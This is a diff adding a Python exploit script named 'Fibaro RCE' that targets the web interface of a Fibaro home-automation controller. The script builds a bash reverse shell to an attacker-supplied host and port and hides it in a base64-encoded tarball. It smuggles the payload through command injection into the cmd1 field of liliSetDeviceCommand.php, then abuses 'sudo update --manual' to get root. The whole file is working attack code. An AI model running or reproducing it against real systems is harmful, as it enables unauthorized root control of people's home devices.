@@ -1,0 +1,45 @@
+#!/usr/bin/python
+
+import requests
+import argparse
+import urllib
+import base64
+import tarfile
+import os
+
+parser = argparse.ArgumentParser(description='Fibaro RCE')
+parser.add_argument('--rhost')
+parser.add_argument('--lhost')
+parser.add_argument('--lport')
+args = parser.parse_args()
+
+f = open('run.sh', 'w')
+f.write('#!/bin/bash\n')
+f.write('/bin/bash -i >& /dev/tcp/' + args.lhost + '/' + args.lport + ' 0>&1\n')
+f.close()
+
+os.chmod('run.sh', 0777)
+
+tar = tarfile.open("root.tar.gz", "w:gz")
+tar.add("run.sh")
+tar.close()
+
+with open("root.tar.gz", "rb") as tarfile:
+tar64 = base64.b64encode(tarfile.read())
+
+wwwexec = urllib.quote_plus(base64.b64encode("echo '" + tar64 + "' | base64 -d > /tmp/patch.tar.gz && sudo update --manual /tmp/patch.tar.gz"))
+
+os.remove('run.sh')
+os.remove('root.tar.gz')
+
+headers = {
+'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0',
+'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+'X-Fibaro-Version': '2',
+'X-Requested-With': 'XMLHttpRequest',
+}
+
+data = 'deviceID=1&deviceName=&deviceType=&cmd1=`echo${IFS}' + wwwexec + '|base64${IFS}-d|/bin/bash`&cmd2=&roomID=1&roomName=&sectionID=&sectionName=&lang=en'
+print "[+] Popping a root shell..."
+
+requests.post('http://' + args.rhost + '/services/liliSetDeviceCommand.php', headers=headers, data=data, verify=False)
